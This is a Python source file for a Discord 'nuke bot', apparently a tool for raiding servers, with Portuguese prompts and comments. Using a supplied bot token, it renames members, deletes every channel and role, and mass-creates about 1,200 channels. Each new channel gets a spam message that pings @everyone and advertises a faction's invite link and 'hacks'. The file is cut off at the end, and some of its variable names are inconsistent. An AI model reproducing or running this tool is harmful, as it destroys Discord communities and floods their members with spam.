import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit
import time
import itertools

# Inicialização do Colorama
init()

# Cores do Colorama
dr = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET

# Função para limpar o terminal
clear = lambda: system('cls') if os_name == 'nt' else system('clear')

# Função personalizada para entrada
def _input(text):
    print(text, end='')
    return input()

# Função para animação RGB no título
def rgb_animation(text, delay=0.1):
    colors = [r, g, b, m, c, y]
    for color in itertools.cycle(colors):
        print(f'\r{color}{text}', end='')
        time.sleep(delay)

# Banner decorado
banner = f'''
{r}██████╗     ██╗  ██╗
{r}██╔══██╗    ██║ ██╔╝
{r}██║  ██║    █████╔╝ 
{r}██║  ██║    ██╔═██╗ 
{r}██████╔╝    ██║  ██╗
{r}╚═════╝     ╚═╝  ╚═╝
{y}Feito por: {g}Menor dk 🇾🇪
'''

# Função para exibir informações dos servidores
async def display_guild_info(guild):
    print(f'\n{r}Servidor: {m}{guild.name}')
    print(f'{c}ID: {g}{guild.id}')
    print(f'{b}Membros: {g}{len(guild.members)}')
    print(f'{y}Canais: {g}{len(guild.channels)}')
    print(f'{m}Roles: {g}{len(guild.roles)}')
    perms = guild.me.guild_permissions
    print(f'{w}Permissões:')
    print(f'  {c}KICK_MEMBERS: {g}{perms.kick_members}')
    print(f'  {c}BAN_MEMBERS: {g}{perms.ban_members}')
    print(f'  {c}MANAGE_CHANNELS: {g}{perms.manage_channels}')
    print(f'  {c}MANAGE_ROLES: {g}{perms.manage_roles}')
    print(f'  {c}ADMINISTRATOR: {g}{perms.administrator}')

async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except:
            continue
    return deleted

async def rename_all_members(guild, name):
    renamed = 0
    for member in guild.members:
        if not member.guild_permissions.administrator:
            try:
                await member.edit(nick=f'{name} ({member.name})')
                renamed += 1
            except:
                continue
    return renamed

async def create_text_channels(guild, name, message):
    created = 0
    for _ in range(10):  # Cria 10 canais por vez
        try:
            channel = await guild.create_text_channel(name=name)
            await channel.send(message)  # Envia mensagem no canal criado
            created += 5
        except:
            continue
    return created

async def nuke_guild(guild, name, message):
    print(f'{r}Nuke: {m}{guild.name}')
    
    # Renomeia membros
    renamed = await rename_all_members(guild, name)
    print(f'{m}Renomeados: {b}{renamed}')
    
    # Deleta canais
    deleted_channels = await delete_all_channel(guild)
    print(f'{m}Canais deletados: {b}{deleted_channels}')
    
    # Deleta roles
    deleted_roles = await delete_all_roles(guild)
    print(f'{m}Roles deletados: {b}{deleted_roles}')
    
    # Cria canais de texto
    created_channels = 0
    while created_channels < 1199:
        created = await create_text_channels(guild, name, message)
        created_channels += created
        print(f'{m}Canais criados: {b}{created_channels}')
        time.sleep(0.555)  # Atraso para evitar problemas
    
    print(f'{r}--------------------------------------------\n\n')

async def main():
    while True:
        clear()
        rgb_animation(f'{banner}                
{c}--------------------------------------------
{b}[Menu]
    {y}└─[1] {m}- {g}Executar Setup Nuke Bot
    {y}└─[2] {m}- {g}Sair
    {y}└─[3] {m}- {g}Parar
    {y}└─[4] {m}- {g}Ver Servidores do Bot
{y}====>{g}', delay=0.1)
        
        choice = _input('Escolha uma opção: ')
        
        if choice == '1':
            token = _input(f'{y}Insira o token do bot:{g}')
            name = _input(f'{y}Insira o nome para os canal/nomes ')
            message = '''# DKZIN 🔥🥋🇾🇪
> - TERCEIRO COMANDO DA CAPITAL NA ATIVA,  ENTREM PRA TROPA E SEJAM FELIZES 👑
- https://discord.com/invite/gZSx3n8Csa

> TEMOS OTIMOS HACKS E METHODOS 
> BOTS DE KEY E MUITO MAIS

@here @everyone'''
            
            clear()
            choice_type = _input(f'''
{banner}                
{c}--------------------------------------------
{b}[Selecione]
    {y}└─[1] {m}- {g}Nuke de todos os servidores.
    {y}└─[2] {m}- {g}Nuke apenas um servidor.
    {y}└─[3] {m}- {g}Sair
{y}====>{g}''')
            
            client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
            
            if choice_type == '1':
                @client.event
                async def on_ready():
                    print(f'[+] Logado como {client.user.name}')
                    print(f'[+] Bot em {len(client.guilds)} servidores!')
                    for guild in client.guilds:
                        await nuke_guild(guild, name, message)
                    await client.close()
            
            elif choice_type == '2':
                guild_id = _input(f'{y}Insira o id do servidor:{g}')
                @client.event
                async def on_ready():
                    for guild in client.guilds:
                        if str(guild.id) == guild_id:
                            await nuke_guild(guild, name, message)
                    await client.close()
            
            elif choice_type == '3':
                print(f'{dr}Saindo...')
                exit()
            
            try:
                client.run(token)
                _input('Nuke concluído, pressione Enter para voltar ao menu...')
                clear()
            except Exception as error:
                if 'Privileged Intents' in str(error):
                    _input(f'{r}Erro de Intents\n{g}Para corrigir -> https://prnt.sc/wmrwut\n{b}Pressione Enter para voltar...')
                else:
                    _input(f'{r}{error}\n{b}Pressione Enter para voltar...')
        
        elif choice == '2':
            print(f'{dr}Saindo...')
            exit()
        
        elif choice == '3':
            clear()
            print(f'{dr}Bot Parado...')
            input('Pressione Enter para voltar ao menu...')
            clear()
        
        elif choice == '4':
            token = _input(f'{y}Insira o token do bot:{g}')
            client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
            
            @client.event
            async def on_ready():
                clear()
                print(f'{banner}                
{c}--------------------------------------------
{b}[Servidores do Bot]')
                for guild in client.guilds:
                    await display_guild_info(guild)
                    print(f'{c}--------------------------------------------')
                await client.close()
            
            try:
                client.run(token)
                _input('Pressione Enter para voltar ao menu...')
                clear()
            except Exception as error:
                _input(f'{r}{error}\n{b}Pressione Enter para voltar...')
        
        else:
            print(f'{r}Opção inválida. Press
